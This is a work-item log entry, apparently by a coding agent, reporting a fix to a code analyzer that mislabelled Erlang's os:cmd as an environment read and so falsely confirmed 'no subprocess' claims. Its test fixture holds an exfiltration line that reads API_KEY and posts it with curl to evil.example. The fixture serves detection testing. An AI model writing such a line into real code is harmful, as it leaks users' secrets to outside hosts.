- op: discuss  # 10fe
  at: '2026-08-13T10:43:58Z'  # 10fe
  by: agent  # 10fe
  actor: jgstern_agent  # 10fe
  clock: 4  # 10fe
  nonce: 10fe  # 10fe
  message: "DONE at dev 89081f57ac. The item asked for the emission-shape measurement\nFIRST; that measurement said GO, and the fix landed with a false confirm closed.\n\nEMISSION SHAPE (the gating question this item was filed with). The Erlang\nanalyzer emits, for `os:cmd(...)`:\n\n    dst  = erlang:os:0-0:cmd:external_symbol\n    meta = {'call_construct': 'remote_external'}\n    is_resolved = False\n\nModule slot `os`, name slot `cmd` -- the shape the catalogue keys on. And the\nPOSITIVE CONTROL that settles it: the existing WRONG row already matched this\nend to end, producing an `env_read` chain with primitive `os.cmd`. The key\nRESOLVED; only the boundary was wrong. So the rows were a PAYOFF, not a\nceiling, and the INV-linub L2-only precedent (analyzer win, zero new findings)\ndid not apply here.\n\n`erlang:open_port` emits erlang:erlang:0-0:open_port:external_symbol and was\ncatalogued NOWHERE -- no chain of any kind.\n\nTHE DEFECT WAS A FALSE CONFIRM, WHICH IS STRONGER THAN THIS ITEM CLAIMED. The\nfiling says a subprocess claim \"can never find a chain\". True, but the call is\nnot INVISIBLE -- it is CLASSIFIED, as env_read, and since INV-buzab a classified\ncall is what `examined` means. So the exfiltration was an EXAMINED NEGATIVE for\nthe boundary that was actually true. Measured on the shipped CLI:\n\n    handler() ->\n        Secret = os:getenv(\"API_KEY\"),\n        os:cmd(\"curl -d \" ++ Secret ++ \" https://evil.example/p\").\n\n    {boundary: subprocess, must_not_exist: true}\n      BEFORE  confirmed rc 0   \"No subprocess chains found.\"   high_risk: false\n      AFTER   violated  rc 1   1 subprocess chain\n\nA CONFOUND ATE THE FIRST MEASUREMENT AND IT FLATTERED THE TOOL. The first\nfixture also called erlang:open_port and returned `inconclusive` rc 2 -- not\nbecause the launch was detected, but because `erlang` is itself an uncatalogued\nmodule and tripped the coverage gate. Isolating os:cmd exposed the clean false\nconfirm. Recorded because the confounded run would have been reported as \"the\ngate already catches it\".\n\nRE-RUN ON THE MERGED TREE (89081f57ac), all arms:\n    subprocess claim                 rc 1  violated\n    env_read claim (NON-DESTRUCTION) rc 1  violated   <- os:getenv still detected\n    boundary map: env_read {os.getenv: 1} high_risk=False\n                  subprocess {os.cmd: 1} high_risk=True\n    total_io_edges unchanged at 2 -- one primitive MOVED, none lost.\n\nONE CATALOGUE, NOT TWO -- correcting this item's filed contrast, and my own\nearlier note on this thread which repeated it. The description says elixir\n\"shares the BEAM and gets it right\". True of System.cmd, FALSE of os.cmd: a\ncensus measured elixir resolving os.cmd to env_read identically, because ELIXIR\nINHERITS ERLANG (the child-over-parent mechanism scala uses for java). Elixir's\nown subprocess: section for System.cmd/Port.open is exactly what made the family\nlook covered. The fix lands once in erlang.yaml, and\ntest_elixir_inherits_the_fix_rather_than_repeating_it asserts the INHERITED\nanswer so a future edit that fixes only the child leaves the parent's defect\nvisible.\n\nRE-KEYED, NOT SUPPLEMENTED. `cmd` was REMOVED from env_read and env_write\nrather than also declared under subprocess, because INV-zumin measured what a\nmulti-boundary primitive does: lookup_with_module returns ONE row decided by\nYAML ROW ORDER, so the correct declaration would have been live or inert\ndepending on where it was pasted. A test pins that os.cmd resolves to\n{subprocess} alone in BOTH languages.\n\nos.cmd and erlang.open_port also joined HIGH_RISK_PRIMITIVES. The existing\nsubprocess drift guard caught this during the red-to-green cycle -- losing the\nboundary had lost the *** HIGH RISK *** marking too, so re-keying alone would\nhave fixed the chain and left the warning missing.\n\nTAINT-ARM DIRECTION, MEASURED NOT ASSUMED. io_primitives auto-derives taint\nentries by boundary (WI-lokuv), so the re-key changes the primitive's ROLE.\nVerified against the merged taint catalogue:\n\n    erlang:  SINK module='os'     name='cmd'       zone='subprocess'\n             SINK module='erlang' name='open_port' zone='subprocess'\n    elixir:  same (inherited), plus its own System.cmd\n\nIt was a SOURCE labelled host_secret (env_read maps there), i.e. modelled as\ndata coming IN rather than a command going OUT -- exactly the mis-modelling\nthis item named.\n\nAND THE HALF THE REMOVAL LEAVES OPEN, filed as WI-rinal rather than left to be\ndiscovered: the source is now ABSENT, and a launched program's OUTPUT is\ngenuinely untrusted input that nothing labels. The old source was still wrong\n(it minted a \"host secret\" from the stdout of `os:cmd(\"ls\")`), so this is a\nrecall gap the change CREATES rather than a regression it causes, and it\ngeneralises past the BEAM to every subprocess primitive returning the child's\noutput.\n\nNOT SWEPT: whether any other catalogue files a shell-out under a non-subprocess\nboundary. erlang was found because it was the only one of fourteen with NO\nsubprocess section at all; a catalogue that HAS one can still mis-key an\nindividual row, and that was not checked.\n\nSuite 22,535 passed / 100% coverage / 6 packages green in isolation / mypy\nratchet clean."  # 10fe
